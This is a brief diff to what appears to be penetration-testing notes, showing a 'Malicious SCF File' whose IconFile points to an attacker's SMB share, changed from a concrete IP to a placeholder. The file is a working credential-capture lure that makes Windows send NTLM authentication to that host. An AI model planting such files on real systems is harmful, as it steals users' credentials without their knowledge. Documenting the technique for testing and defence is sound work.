@@ -144,7 +144,7 @@ Malicious SCF File
 ```
 [Shell]
 Command=2
-IconFile=\\192.168.1.4\smbfolder\CronoX.ico
+IconFile=\\IP\smbfolder\CronoX.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
